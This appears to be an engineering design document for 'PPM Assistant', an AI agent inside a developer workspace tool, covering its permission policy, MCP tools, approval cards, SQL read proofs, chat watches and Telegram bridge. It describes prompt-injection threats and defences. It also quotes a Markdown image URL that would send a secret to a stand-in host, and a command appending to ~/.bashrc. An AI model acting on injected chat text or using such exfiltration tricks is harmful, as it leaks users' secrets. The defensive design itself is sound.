# PPM Assistant

> Part of [AI Chat & Providers](ai-chat-and-providers.md#ppm-assistant).

An AI chat that works *on PPM* rather than on a project: it sees the screen of the device the
user is chatting from, finds and reads chats, reads databases and open tabs, opens and closes
tabs, switches projects, runs Command Palette commands, and sends messages into the user's
working chats. It also runs those chats for the user: it says which ones are waiting on them,
opens new ones, answers their approval cards (after a confirmation), and reports when a chat it
was asked to watch finishes. The same conversation can be carried on from **Telegram**, which is
a second window onto one Assistant session ([Telegram](#telegram)). It runs on Claude and Codex.
It reads content it did not write — other chats, database rows, terminal output — so the design
rule is: **navigating and reading inside the registered projects run unasked; anything that
changes data or could carry data off the machine asks first**, whatever mode the composer shows.

It replaces PPMBot, the earlier Telegram "coordinator": that ran its own session in bypass mode
and delegated work by running `ppm bot delegate` in a shell, so nothing it did was ever asked.
The coordinator, the `ppm bot` CLI and task delegation are gone; the bot, its connected chats,
the connect link and the `clawbot` settings key were kept so nobody has to connect again.

## Sessions

**A virtual project.** Assistant sessions live in the reserved project `__assistant__`
(`src/shared/assistant-project.ts`). Only the chat path resolves it — the chat WebSocket and
the `/chat` sub-router, through `resolveChatProjectPath` (`src/server/helpers/resolve-chat-project.ts`)
— so it never gets a terminal, LSP root, git surface or file tree. `projectService` refuses to
register a real project under that name, and the browser keeps it out of URLs, the project
picker and workspace sync.

**The work directory** is `<ppm dir>/assistant/<database name>` (`assistant-work-dir.ts`), one
per database file, because dev (`ppm.dev.db`) and production (`ppm.db`) share the PPM dir and
both providers list a project's sessions by working directory. One shared folder would show each
instance's Assistant chats in the other's list.

**Marking a session.** `session_metadata.assistant` (migration 57) is written when the session
is created, and copied when Codex renames the session on its first turn and when a session is
forked. `isAssistantSession` (`src/services/assistant/assistant-session.ts`) answers true on the
mark of the id, the mark of the id it migrated to, *or* the session's working directory being
the Assistant's. Losing the answer is the dangerous direction — an Assistant session read as an
ordinary one falls back to the provider default, usually bypass — so any one source is enough.
Assistant sessions never adopt a warm spare and get no tab tools.

**Permissions** ignore the composer's mode. Claude is forced to `default`, because the policy
lives in the PreToolUse hook and bypass mode installs no hook; `assistantToolDecision`
(`src/services/assistant/assistant-tool-policy.ts`) decides there, with the same check as a
`canUseTool` backstop. It allows only Read, Glob and Grep that resolve inside a registered
project and outside the private roots (`assistant-private-paths.ts`: PPM's own credential
folders plus the login and key stores common tools keep under the home folder, which matter when
a project is registered at or above home), ToolSearch, TodoWrite, and the Assistant's own MCP
tools by exact name. Everything else asks: web, shell, writes, subagents, skills, other MCP
servers, reads anywhere else. It fails closed: a path that cannot be resolved, a relative path
with no working directory, or a Windows network path (answered without touching the disk) asks.
Codex gets its own profile (below).

**The UI.** One tab type, `assistant` (`src/web/components/assistant/`): on a desktop it opens
inside a `tab-host` floating window, below `md` it stays a tab, and it belongs to no project so
it comes onto whichever grid is on screen. It holds the session list, a new-session button per
provider that `supportsAssistantSessions`, and the chat with its permission chip locked. It opens
from the Command Palette (*PPM Assistant*), an unbound keybinding (`open-assistant`) and
notifications, all through `openAssistant`.

## Isolation

The Assistant inherits none of the user's own agent setup or of ordinary chats' settings.
Settings → AI & Accounts → **PPM Assistant** (`/api/assistant/settings`, config key `assistant`,
shape and validation in `src/shared/assistant-settings.ts`) holds its default provider, a model
and effort per provider, extra instructions appended after PPM's own, and its own MCP servers.
Those servers' `env` and header values never reach a browser (the whole list is in
`SECRET_CONFIG_KEYS`), and a saved header is dropped when its server's URL moves to another
origin.

- **Claude**: the query runs with `settingSources: []` — no user or project settings, hooks,
  plugins, skills or `CLAUDE.md`, the way `completeOnce` runs — plus `strictMcpConfig`, so the
  MCP servers are exactly the Assistant's own (`assistantMcpServers`). The provider's
  *Additional Instructions* are not applied. Authentication is unaffected (it comes from
  `buildQueryEnv` and the CLI's credential store), but anything only `~/.claude/settings.json`
  provides is gone, its `env` block and `apiKeyHelper` included. The CLI is also started
  without `RIPGREP_CONFIG_PATH` (`buildQueryEnv(…, { assistantSession: true })`): Glob and
  Grep run the CLI's embedded ripgrep without `--follow`, so they skip every link below the
  folder they search (measured on the bundled CLI's ripgrep), and a ripgrep config file is the
  one thing that could turn following on. The policy still asks for Glob and Grep should the
  CLI's environment ever carry that variable; it judges the environment the CLI was started
  with, not PPM's own.
- **Codex**: a separate permission profile, `ASSISTANT_PERMISSION` (read-only sandbox,
  `untrusted` approvals), and mandatory developer instructions — a Codex too old to take them
  fails the session (`RequiredInstructionsError`) instead of running it uninstructed.
  - **A CODEX_HOME of its own.** No codex setting skips `$CODEX_HOME/AGENTS.md`
    (`project_doc_max_bytes = 0` and `instructions = ""` do not), and the same folder holds the
    user's `config.toml`, hooks, agents, plugins and skills. So an Assistant app-server runs on
    `<ppm dir>/assistant/codex-homes/<account folder>-<hash>` (`codex-assistant-home.ts`), which
    holds none of them and is joined to the account's home by two links: `auth.json` is a hard
    link to the account's file (a symlink where a hard link is refused) — codex rewrites it in
    place, so a token refreshed from either home lands in the one file instead of forking a
    rotating refresh token — and `sessions` is a junction (Windows) or directory symlink to the
    account's `sessions`, so the Assistant's rollouts are where PPM's history readers look and a
    resume finds them. The links are checked on every spawn and relinked if they no longer join
    the two files, writing a newer login found only on the Assistant's side back into the
    account's file first. Removing a Codex account deletes its Assistant home at once
    (`removeCodexAccount` → `removeAssistantCodexHome`), taking the links out before anything
    else so the delete never reaches the account's files; any home left behind is swept on the
    next Assistant spawn. Where the home cannot be set up — the account keeps no `auth.json`
    (a keyring login), or the file system refuses the links — the session runs on the account's
    own home, with a warning in the log (see Known limitations).
  - **Skills are switched off by name.** Skills under the user's home folder
    (`~/.agents/skills`) are found whatever `CODEX_HOME` says, so the catalogue is kept out of the
    prompt (`skills.include_instructions = false`), bundled skills are off, and each skill the
    app-server lists is disabled by name (`codex-assistant-skills.ts`, `skills.config`).
  - **The rest of the user's config.** `planAssistantCodexMcp` (`codex-assistant-mcp-guard.ts`)
    reads the effective config back with `config/read` — on the Assistant's own home that is
    only what codex finds outside it, and on the fallback the account's `config.toml` — and
    `assistantSessionConfig` (`codex-thread-params.ts`) disables each of those servers by name,
    turns off web search, apps, plugins, hooks and `notify`, and adds the Assistant's servers.
    An unreadable config refuses the session; so does a user server with the same name as one of
    the Assistant's, because Codex merges same-named tables key by key.
  - **Generated images** land in the Assistant home's own `generated_images`. The file guard's
    read exception for codex pictures (`isCodexGeneratedImagePath` in
    `fs-credential-path-guard.ts`) covers that folder as it covers an account home's, so the
    chat shows them; the home's `auth.json`, marker and `sessions` link stay refused.
- **Shared context**: the user's shared instructions and memories are not added to Assistant
  turns, whatever `share_provider_context` says. Only PPM's own entries ride in that block: the UI
  summary, the channel entry (a turn typed on Telegram says so on every message, and the first
  PPM message after it says the user is back on a screen — `TELEGRAM_CHANNEL_CONTEXT_ENTRY` /
  `BACK_ON_PPM_CONTEXT_ENTRY` in `chat.service.ts`), and a watch turn's news (below).
- **Shell**: an Assistant session's shell gets `PPM_HOME` naming this instance's folder
  (`assistant-shell-env.ts`, both providers), so a `ppm …` command the user approves reaches this
  PPM and not whatever `~/.ppm` holds.
- **External resources**: Assistant Markdown never makes the browser fetch anything by itself.
  `markdown-external-resources.ts` turns external images and embeds into links and holds the
  rest to an allowlist (`markdown-assistant-allowlist.ts`), because a rendered
  `![](https://x/?k=<secret>)` would send the secret with no click and no approval.

## Tools: `/api/assistant-mcp`

One endpoint serves both providers (`src/services/assistant-mcp/assistant-mcp-endpoint.ts`,
mounted before PPM's auth). It is built on the same `mcp-http-endpoint.ts` and
`mcp-session-tokens.ts` as the tab tools: a per-session capability token, held in memory and
revoked when the session is deleted. A token is honoured only while its session — followed
through a Codex rename — is still an Assistant session, checked on every request. A tool call
lifts Bun's 10 s idle cut for its request altogether (`ASSISTANT_MCP_HOLD_OPEN_SECONDS` = 0,
Bun's "no limit"), and the providers get the longest tool timeout each holds
(`ASSISTANT_MCP_TIMEOUT_MS`, 2^31 − 1 ms ≈ 24.8 days; Codex's `tool_timeout_sec` is the same in
seconds), because an approval waits as long as the user takes. Neither provider takes "no
limit": Claude clamps a server's `timeout` to that figure, the longest a JS timer holds, and
leaving it unset is worse — an HTTP server's call is then cut after five minutes of silence. The
Claude permission hook gets the same treatment (`PERMISSION_HOOK_TIMEOUT_SECONDS`): the CLI's own
default would stop waiting for it after ten minutes, with the provider's own card still up.

Every tool that takes a project checks it against the registered projects, and every tool
taking a `sessionId` proves the session belongs to that project and is not an Assistant
session. The names, in order, are `ASSISTANT_TOOLS` in `src/shared/assistant-tool-names.ts`
(Claude spells them `mcp__ppm-assistant__<tool>`, Codex `ppm_assistant:<tool>`).

- **Read, never ask**: `projects_list`, `chat_list_sessions`, `chat_search`,
  `chat_read_messages`, `db_list_connections`, `db_query` for a proven read, `ui_get_state`,
  `ui_read_tab` (see below), `ui_list_commands`, `chats_attention`, `ppm_cli_reference`,
  `chat_list_watches`.
- **Remember, never ask**: `chat_watch` and `chat_unwatch` — a watch only reads and reports, like
  setting a reminder (see [Watches](#watches)).
- **Navigate the chatting device, never ask**: `ui_open_tab`, `ui_focus_tab`,
  `ui_switch_project`, and `ui_close_tab` for a tab that loses nothing. Each answers
  `previousProject` or enough to reopen what it closed, so the agent can undo — there is no
  Undo of PPM's own.
- **Ask first**: `db_query` for anything not proven to read, `chat_send_message`, `chat_start`
  and `chat_answer_approval` (always — the last even to deny, since a denial changes what that
  chat does next),
  `ui_run_command` for a command declared `changesData` and for every extension command,
  `ui_close_tab` for a tab that would lose work (unsaved editor text, unsaved SQL or table edits,
  a terminal), and `ui_read_tab` for an editor's unsaved text, a terminal's output or a database
  file's rows from outside every registered project or from a credential store (below) — a file
  tab itself answers with its path, and reading the file is the provider's read tool's call.

**Reading a tab** (`assistant-tab-reader.ts`). A file tab answers with the file's absolute path
and its project, never the file: the agent reads it with its provider's own read tool, so one
rule decides every file read — Claude's `Read` under the Assistant policy (inside the projects
unasked, elsewhere and in credential stores with a card), Codex natively. What no read tool can
reach comes back from `ui_read_tab` itself, under the same rule: an editor's unsaved text, a
terminal's output, and the SQL and rows of a database tab on a SQLite file opened by path (no
saved connection, so no *Available to the AI* setting to consult) are returned unasked inside a
registered project and outside the private roots, and otherwise only after a card
(`readOutsideSummary`). PPM's own folder and paths on no local drive are refused outright,
checked before the disk is touched.

Databases follow the user's per-connection choices: a connection with *Available to the AI
chat* off (`ai_access = 0`) is neither listed, queried, opened nor read through a database tab,
and a read-only connection never runs a write, approved or not. Every statement is audited with
`actor = "agent"`.

**Old values of a write** (`assistant-write-old-rows.ts`, `assistant-sql-write-target.ts`). An
approved UPDATE or DELETE answers `{ rowsAffected, columns, oldRows, oldRowsCapped }`: the rows it
changes as they were, read by `SELECT * FROM <same table> [AS alias] [WHERE <same condition>]` on
one query session, inside the write's own transaction (`BEGIN` / `START TRANSACTION` /
SQLite's `BEGIN IMMEDIATE`, which takes the write lock the UPDATE would take anyway, only first),
immediately before it; at most 200 rows. Only the plain single-table shape is read that way —
no `FROM`/`USING`/`JOIN` or comma list, no `ONLY`, `WITH`, modifiers, `WHERE CURRENT OF`,
`ORDER BY`/`LIMIT`, `RETURNING` or nested write — and the SELECT must be provable like an
unasked read (safe-listed functions, nothing more reached by the catalog), since it re-runs the
WHERE. A WHERE that may answer differently a moment later (`random()`; the clock on MySQL and
SQLite — Postgres fixes it per transaction) is not read either. Anything else runs as typed,
with `oldRows: null` and an `oldRowsNote` saying why. No locking clause is added, so on Postgres
and MySQL a commit landing between the two statements can make the rows differ from what the
write saw; a SELECT that fails (a login allowed to UPDATE but not to SELECT) rolls back and the
write runs on its own. Only the write is audited; the SELECT is PPM's own.

## The chatting device

Only the browser knows what it shows, so the screen tools are a round trip through a device
broker (`createDeviceBroker` in `tab-open-broker.ts`, keyed by `resolveMigratedSession`) over the
chat WebSocket (`assistant_ui` / `assistant_ui_result`, `src/shared/assistant-ui-protocol.ts`).
Delivery is **strict**: `deliverToChattingDevice(…, { strict: true })` in `src/server/ws/chat.ts`
sends only to the device that sent the session's latest message. If that socket has gone, only
the same browser tab reconnected qualifies, recognised by the per-tab `clientId` it connects
with (`src/shared/chat-client-id.ts`); otherwise the call answers `no-device`. It never falls
back to every device, unlike the tab tools, because switching project or running a git pull on a
screen nobody is talking from is not harmless. A message that arrives with no socket — typed on
Telegram, or a watch turn — clears the chatting device, so the screen tools answer `no-device`
even while PPM is open somewhere: the user is on their phone, and a PPM screen left open on a
desk is not where they are looking. The browser half is
`src/web/lib/assistant-ui/` (`answer-assistant-ui.ts` dispatches by `op`), and it answers only
for an Assistant session.

**The per-turn UI summary.** Each Assistant message carries a short picture of the sender's
screen, built in the browser (`ui-summary.ts`), validated, cleaned and capped on the server
(`assistant-ui-summary.ts`), and placed as one entry *inside* the `<ppm-shared-context>` block —
not a new tag — so the existing `stripSharedContext` keeps it out of history, titles and search.
It is sent regardless of `share_provider_context`, skipped for `/` commands, labelled as data,
and never includes tab content: the agent calls `ui_read_tab` when it needs that.

**Commands** come from one registry shared by the palette, the global keybindings and the
Assistant (`src/web/lib/commands/command-registry.ts`). Each command declares `changesData`; an
extension's command is always treated as changing data. `ui_run_command` reads that flag from
the device's own `list_commands` entry before anything runs, and only a run request built after
approval carries the `approved` marker the device requires.

## Approvals

**One card per session.** A session shows one approval card at a time, shared between the
provider's own approvals (Claude's permission hook; Codex's command and patch requests, and its
MCP tool approvals for the servers configured in Settings → PPM Assistant, which always ask) and
the endpoint's. They queue behind each
other instead of overwriting, and every way a card leaves goes through
`src/server/ws/chat-pending-approval.ts`, which finishes the request on whichever side waits for
it. Typing a message instead of answering, stopping the turn, or the turn ending withdraws an
endpoint request with that reason.

**The endpoint's broker** (`assistant-approval-broker.ts`) puts the card on every device showing
the session (it is a question, not a screen action), sends the usual approval notification, and
takes the first answer. A card waits until it is answered — shown or queued behind another,
with no time limit — or until the turn, the call or PPM itself goes away: a restart drops every
waiting request with the process, and an answer to one then gets "no longer valid" (below).
`PPM_ASSISTANT_APPROVAL_TIMEOUT_MS` sets an answer window for tests and e2e fixtures only,
counted from when the card is *shown* and held under the providers' own tool timeout. Outcomes
are approved, denied, withdrawn or unavailable (and timeout, only under that variable), and only
approved runs anything. The device broker under it arms no timer for an unbounded wait
(`createDeviceBroker`), since a delay past 2^31 − 1 ms would fire at once instead of never.

**What the card shows** is built by the server from the checked input, never from the agent's
own wording (`assistant-approval-summary.ts`): the full SQL or message, wrapped, with hidden and
bidirectional characters made visible, and for `chat_send_message` the target chat's permission
mode and where it comes from. That mode is checked again at send time and the message is not sent
if it changed. Every chat now has its permission mode stored on the server for this reason.

**Stale answers.** An `approval_response` for a request nothing holds any more — answered on
another device, ended, or from before a restart — gets `approval_stale` and "no longer valid",
never an `approval_resolved`, so a card from before a restart cannot look as if it ran.

## Proving a read

A read-only transaction is not proof that a query only reads: functions can still terminate
backends, take locks, write through another connection or sleep. So `db_query` runs unasked only
when two checks pass, and anything else goes to an approval card:

1. **The text** (`assistant-sql-safety.ts`): a plain read, no assigning `PRAGMA`, no locking
   clause, and every function called is on a short safe list (aggregates, string, date, math,
   JSON accessors, casts). A read that misses the list costs one question, by design.
2. **What the text reaches** (`assistant-sql-reach-check.ts`), asked of the catalog on the
   read-only path without planning or running the query:
   - **Postgres** (`assistant-sql-reach-postgres.ts`): views and row-level policies the query
     can reach, generated columns, domain checks, user casts, user functions named like any word
     of the query, and user operators, each judged by the same rules. `EXPLAIN` is not used, because
     planning runs user code; the file header records what was measured. Only Postgres's own
     `pg_catalog` functions are trusted: an installed extension's count as user functions, so on a
     database with citext `max(…)` asks (its aggregate shadows the safe-listed one). A user
     operator asks only where the query can make Postgres choose it, which goes by operand type:
     on that database `WHERE id = 1` and `SELECT id FROM t` run unasked, while reading a citext
     column (its output is extension code; also through `*`, a whole-row `t`, a view or a domain
     or array over it), writing the type (`::citext`, `CAST(… AS citext)`, `citext 'x'`) or using
     a user operator on a value of its type asks. An operator a built-in type can reach (one on
     `text`, a domain over a built-in, or a type with an implicit cast from one) still asks
     wherever its symbol, or a keyword standing for it (`IN`, `LIKE`, `BETWEEN`…), is written.
   - **MySQL/MariaDB** (`assistant-sql-reach-mysql.ts`): any view the query could name, or a
     stored function named like a safe-listed call, sends it to approval.
   - **SQLite**: no catalog read. A view can only call SQLite's built-ins, `load_extension()` is
     refused by bun:sqlite, and the file is opened read-only.

Any catalog error means asking, never running. A proven read then runs on the connection's
read-only path with a 60 s limit (`UNASKED_READ_TIMEOUT_MS`) and is stopped when the MCP call
closes (`src/services/database/query-stop.ts`). An approved query is the user's to run to the end.

## Running the user's chats

Four tools in `src/services/assistant-mcp/assistant-hub-tools.ts` let the Assistant manage the
user's working chats instead of only reading them. They are what PPMBot's shell delegation was
for, rebuilt as tools that ask.

- **`chats_attention`** (`src/services/assistant-hub/chat-attention.service.ts`) answers "which
  chats need me": chats waiting on a card or question, running, whose card was lost (an unread
  approval with no live card — PPM restarted under it), stopped by an error, finished unread, and
  finished and read. It has to merge three sources, because none sees everything: live cards are
  only in memory (`chatControl().listLive()`), unread marks are in the database (so a chat never
  opened since the restart still counts), and how a turn ended is in the session trace
  (`src/services/session-trace/turn-ends-query.ts`). Assistant sessions are left out. Titles and
  card text come back labelled as data from those chats, not instructions.
- **`chat_start`** creates a chat in a registered project (`createProjectChatSession` in
  `src/services/chat-session-create.ts`, which the REST route shares), stores its mode and model,
  and sends the first message — after a card naming the project, provider, model, the mode the
  chat **runs in** and where that mode came from. Without an explicit mode it uses
  `providerDefaultMode`, the mode a chat opened by hand in PPM gets: the Assistant must not open
  chats that behave differently from the user's own. A bypass mode adds a warning line to the card,
  on PPM and on Telegram. `watch: true` also sets a watch on the new chat.
- **`chat_answer_approval`** answers another chat's waiting card. Its confirmation card copies the
  target card's deciding input (below) verbatim, the turn re-checks that the card is still there
  before answering, and an answer that lost the race reports that it was answered elsewhere. It
  refuses Allow when the target's deciding input is incomplete or a question is secret: the
  confirmation card always fits on Telegram, so wrapping an incomplete card in it would turn
  "cannot be reviewed here" into a one-tap Allow. Deny still works.
- **`ppm_cli_reference`** (`src/services/assistant/ppm-cli-reference.ts`, regenerated by
  `scripts/generate-ppm-cli-reference.ts`) teaches the `ppm` CLI on demand instead of pasting it
  into every message as PPMBot did. Its header matters more than the reference: how to invoke
  *this* instance's CLI, which commands go through the running server and which open the database
  themselves, and — on a server running a non-default database profile — a warning not to run
  data commands at all, because only `ppm start` can choose a profile and every other command
  opens `ppm.db`, another instance's data. Anything without a tool of its own (git, schedules,
  tunnels, extensions) is done through `ppm …` in the shell, which always asks.

**The deciding input** (`src/services/chat-control/approval-deciding-input.ts`) is what a person
must see to decide a card: the whole command and its folder, the URL and prompt, every byte a
write puts down, every edit, a patch's whole diff, an MCP call's full arguments, an Assistant card's
headline, facts and body. One builder serves every place a card is shown away from its chat —
the confirmation card, Telegram, relayed cards, `chats_attention` — so no surface can approve
something other than what runs. It escapes and never strips: the older screen-summary cleaner
removed `<`, `>` and backticks, which turned `echo x > ~/.bashrc` into a different command. It
answers `complete: false` when PPM does not hold all of it (a Codex patch whose full diff it never
got).

**One question shape** (`src/shared/approval-questions.ts`). Claude's AskUserQuestion keys answers
by the question's text, Codex's `requestUserInput` by an id and sends its input as a string. Cards
now carry normalised questions, every surface answers by question id (`answersById`), and the
server converts to each provider's form; the older web shape is still accepted. This is also what
gave Codex questions a working form on the web (it was empty). A secret answer is shown and traced
as `(hidden)`.

## Server-side chat control

Telegram and watches act on chats with no browser attached, so everything a browser could do to a
chat is exposed inside the server by `chatControl()` (`src/services/chat-control/chat-control.ts`),
which `src/server/ws/chat.ts` registers: send a user message, answer a card, stop a turn, read a
chat's live state. Each runs the same core the WebSocket handler runs, so the first answer to a
card still wins and nothing gets a second rule set. There is no HTTP route to it, and callers must
carry a person's decision — a button pressed, a message typed.

Origins say who acts. `telegram` is the user typing elsewhere: like a typed message it supersedes a
waiting card. `watch` is never the user: it is refused with `busy` while the chat has a card or a
running turn, rather than cancelling or steering either. `assistant` is a message the Assistant
sends with approval. All three are trace origins too (`TraceOrigin` in `src/shared/session-trace.ts`).

`chatLifecycle` (`src/services/chat-control/chat-lifecycle.ts`) is the bus the rest listens on; the
event names and payloads are `ChatLifecycleEvents`. It is emitted whether or not a browser is
connected — the socket layer drops events when no client is there, and a turn started from
Telegram has none. Listeners run on the chat's hot path, so they only record or enqueue, and one
that throws is logged, never felt by the chat. Every way a card can leave
(`src/server/ws/chat-pending-approval.ts`) emits `approval_resolved` with its reason, so a card
answered or withdrawn anywhere loses its buttons everywhere.

`addNotificationSuppressor` (`notification-suppressor.ts`) lets the bridge and the watch service
hold back a push that would repeat what the user was just told; the unread mark is still set.

The binding and watch tables (migration 58) are behind `src/services/assistant-hub/assistant-hub-db.ts`,
which reads every id through `resolveMigratedSession`, because Codex renames a new session during
its first turn.

## Watches

"Tell me when that chat is done" (`chat_watch`, `chat_unwatch`, `chat_list_watches` in
`src/services/assistant-mcp/assistant-watch-tools.ts`; service
`src/services/assistant-watch/assistant-watch.service.ts`). A watch is a database row, so it
outlives a restart, and it covers one run of the target chat.

- **What wakes the Assistant**: the watched run finishing, stopping on an error, being interrupted
  by a restart (the watch was armed while the chat ran and the trace has no end for that run —
  `watch-turn-end-reader.ts`), or the watch expiring. Each wakes the Assistant session that set it
  for one short turn so the report arrives as a message in the conversation.
- **A card does not wake it.** A card in the watched chat only raises `watch_decision`
  (`watch-events.ts`) and is relayed with buttons (see Telegram). A model turn per card would cost
  a turn per tool call, and would invite the model to act on a card the user never saw. Every
  watch relays its chat's cards whatever `notifyOn` says; `notifyOn` only picks which ends of the
  run (`done`, `stopped`) wake the Assistant.
- **Wake turns cannot change anything.** Such a turn carries another chat's words, and a card in
  it is one tap on a phone at a moment the user did not choose — the shortest path from injected
  text to an action. So everything that would ask is refused without a card
  (`WATCH_TURN_REFUSAL`): the endpoint returns that reason, and the provider's own approvals are
  denied outright. A message the user types into the turn makes it theirs again.
- **The news is not a message.** The turn's message is the fixed `WATCH_OPENER`; what happened is
  an entry in the shared-context block (`watch-event-text.ts`), which `stripSharedContext` keeps out
  of history, titles and search. `<ppm-…` tags typed by a user into an Assistant session are
  neutralised so nobody can fake one.
- **Caps.** Active watches per session, the expiry, and wake turns per Assistant session per hour
  are constants in `watch-state.ts` and `assistant-watch.service.ts`; news beyond the hourly cap,
  or arriving while the session is busy, waits and goes into the next turn together.
- **Delivered means answered.** A report counts as delivered only when its turn ends with text.
  A failed or silent turn is retried; after `MAX_REPORT_ATTEMPTS` a push names the chat instead. A
  turn the user stopped is closed with no retry and no push.
- **Who hears it.** A session bound to Telegram reports through that chat (the mirror below). An
  unbound session gets a push naming the watched chat in place of its generic "Chat completed",
  and the relay sends the report to every connected Telegram chat.

Deleting an Assistant session deletes its watches. Asking to watch a chat whose run already ended
after the user asked answers with how it ended instead of creating a watch.

## Telegram

**A second window onto one Assistant session**, not a separate bot: what the user writes on the
phone goes into the session, and the session's answers, cards and the messages typed in PPM come
back out. Code in `src/services/assistant-telegram/`, entry `assistant-telegram.service.ts`; the
shared Bot API client, formatter and fake in `src/services/telegram/` and
`tests/helpers/fake-telegram-bot-api.ts`. The API base can be pointed only at a loopback address
(`telegram-api-base.ts`), so a test setting cannot send the token off the machine.

**Who may talk** (`assistant-telegram-access.ts`): a private chat, connected with a link from PPM
and not revoked, written to by the person who connected it. In a group anyone could command an AI
that runs on this machine, so groups are refused. The same checks run before **every send**: a
chat revoked in the middle of a turn must not keep receiving it, and a private chat's id being its
user's id is what makes that check possible without an incoming update. A refused chat is told
once. A chat connected before PPM recorded who connected it has to reconnect.

**Binding** (`assistant-telegram-binding.ts`, table `assistant_telegram_bindings`). Each connected
chat talks to one session; the first message creates one on the Assistant's default provider when
it can run Assistant sessions, else on the first provider that can. `/new`, `/sessions` and PPM's
*Use on Telegram* (`POST /api/assistant/telegram/bind`) move it. Changes go out on `/ws/global`
(`assistant:telegram_binding_changed`, and `sessions:list_changed` when a session was created) so
PPM's session list marks the bound session without polling. Revoking a chat in Settings unbinds it
and drops anything still queued for it (`forgetChat`).

**Coming in** (`assistant-telegram-poller.ts`, `assistant-telegram-inbound.ts`). Updates are
handled in order per chat, so a button press and a message in one batch do not race; a press is
acknowledged at once and acted on after. Messages are grouped for `clawbot.debounce_ms`. The read
position advances only after a message has been handed to the session, and is saved in the config
row `assistant_telegram_state` (tied to the bot, so a new token does not inherit an old offset).
A message sent while PPM was off and older than `BACKLOG_AGE_MS` asks *Run* / *Skip* instead of
running unannounced. A forwarded message is wrapped as someone else's words and never read as a
command. Photos up to `MAX_PHOTO_BYTES` reach the session; other files do not. `/start <token>`
goes to the connect code before any access check, since it is how a chat becomes allowed.

**Going out** (`assistant-telegram-mirror.ts`, `assistant-telegram-turn-renderer.ts`,
`assistant-telegram-send-queue.ts`). For each bound session the mirror streams the answer by
editing one message, shows a message typed in PPM as `🖥 (PPM) …` and a watch turn with a 🔔 line,
and hands cards to the card module; tool names appear only when `clawbot.show_tool_calls` is on,
and tool input and output are never sent. Telegram does not notify on an edit, so a turn longer
than `LONG_TURN_MS`, and every watch turn, ends with a **new** message and the draft is deleted.
Each chat has its own send lane: it honours `retry_after` without holding up other chats, never
drops a final answer, splits long answers before Telegram's limit, and re-sends without its URL
button when Telegram refuses the button. After a restart, drafts that were being written say the
answer was cut off and open cards lose their buttons.

**What leaves the machine** goes through `redactForTelegram` (`telegram-html-format.ts`): known
secret shapes (tokens, keys, PEM blocks, cloud and chat-service keys) are hidden. Unlike the log
redaction it keeps PPM's own tunnel or Tailscale address, because that link is how the user gets
back, and it still needs PPM's login. Markdown is escaped before it is converted to Telegram HTML;
PPMBot's formatter did not, and one `<` in an answer made Telegram refuse the whole message.

**Read and quiet.** When a final answer reaches the phone the session is marked read, and its
"Chat completed" / "Waiting for approval" push is held back only if a message to that chat was
actually *sent* within `SUPPRESS_WINDOW_MS`. Basing it on successful sends rather than on polling
means a blocked bot or a failing send still lets the push through.

### Cards and the Allow rule

A session's card appears on Telegram as the same card: whichever answer comes first, in PPM or on
the phone, wins, and the other copy loses its buttons. **Allow is offered only when the card's
whole deciding input is on the card** — escaped, secrets hidden (the card says how many), and
within `REVIEW_FIT_MAX` (`assistant-telegram-card-format.ts`). Otherwise the card shows a preview
marked "Too long to review here" with Deny and Open in PPM only. Allow is a promise that the
person saw what they allowed; a phone screen that shows half a command cannot make it.

Questions show their choices as buttons (several at once: toggle, then Send); a question that
only takes typed text points to PPM. Buttons carry random codes bound to the chat they were sent
to (`assistant-telegram-button-codes.ts`): pressing one spends every code of that card, and after
a restart every code is "no longer valid", so nothing pressed on an old card can run.

**Relayed cards** (`assistant-telegram-relay.ts`). A watched chat's card goes to the chats bound to
the Assistant session that set the watch, or to every connected chat when that session is
unbound. Pressing a button answers the watched chat directly, with no model turn — safe because a
person pressed it, and the Allow rule guarantees they saw what it allows. The relay also sends
reports of unbound sessions' watches to every connected chat. A card is shown once per chat, even
when two watches and `/status` all want it.

### Commands, links and settings

Commands are `BOT_COMMANDS` in `assistant-telegram-commands.ts` (`/new`, `/sessions`, `/status`,
`/stop`, `/help`, plus `/start`). `/status` is `chats_attention` in a message
(`assistant-telegram-status.ts`), followed by the cards it lists with working buttons. There is no
`/restart`: a restart is a change, and the Assistant can run `ppm restart` in a shell, which asks.

"Open in PPM" links point to `/assistant?session=<provider>/<id>` (`notificationPath` in
`src/services/notification-format.ts`, parsed by `src/web/lib/assistant-deep-link.ts`), which
opens the Assistant on whatever project is on screen; the old `/project/__assistant__?openChat=…`
form opened the first project's chat instead and is redirected. A link is a button only when it is
public https — a tunnel or Tailscale Service address — because Telegram refuses a whole message
whose button points at localhost or a LAN address (`assistant-telegram-links.ts`); otherwise it
sits in the text.

**Settings → PPM Assistant → Telegram** (`src/web/components/settings/assistant-telegram-settings.tsx`)
holds the Assistant's own bot token (the `ppmbot_telegram` row, separate from the Notifications
bot, so a chat connected for alerts cannot command the Assistant), the switch, the connected chats
with the session each talks to, the Connect link, and the two display settings. The old settings
id `ppmbot` opens it (`assistant-settings-tab-store.ts`). The REST surface stayed where PPMBot had
it, under `/api/settings/clawbot*` in `src/server/routes/settings.ts`, now taking only `enabled`,
`show_tool_calls` and `debounce_ms`; `/api/assistant/telegram` (`src/server/routes/assistant-telegram.ts`)
lists chats and their sessions, binds, and lists PPMBot's old memories. The Assistant's session
list marks the bound session and offers *Use on Telegram* (`assistant-session-row.tsx`, `src/web/hooks/use-assistant-telegram-binding.ts`).

**From PPMBot** (`ppmbot-migration.ts`, once): only the user-written `system_prompt` is copied into
the Assistant's instructions. Memories PPMBot's AI wrote for itself (`clawbot_memories`) are not:
the instructions are the most trusted text a session gets, and an AI-written memory could have
been planted by what it read. Settings → PPM Assistant → General lists them for the user to copy by
hand. PPMBot's old tables are left in place, unused.

## Startup

`startAssistantHub()` (`src/services/assistant-hub/assistant-hub-startup.ts`) starts the watch
service, carries PPMBot's settings over, then starts the Telegram bridge when it is switched on and
has a bot. `src/server/index.ts` and the e2e fixture call the same function, so a test exercises
the wiring the server runs. A Telegram failure (bad token, Telegram unreachable) is logged and shown
in Settings, never stops the server or the watches. Settings calls `syncAssistantTelegram` after a
change. Telegram allows one `getUpdates` reader per bot, so while the bridge reads a bot it tells
the connect-link poller to leave that bot alone (`assistantBridgeReading` in
`src/services/telegram-connect.service.ts`).

## Rules the hub keeps

- Telegram changes nothing about what asks: an Assistant session is still forced to ask, the cards
  are the same cards, and PPMBot's bypass path no longer exists anywhere.
- A watch turn never asks and never acts; a card in a watched chat never starts a model turn.
- Allow appears only where the whole deciding input is visible; everything else is Deny or PPM.
- Private chat, still connected, the right person — checked on receipt and on every send.
- No tool input or output is sent to Telegram; text is redacted before it leaves.
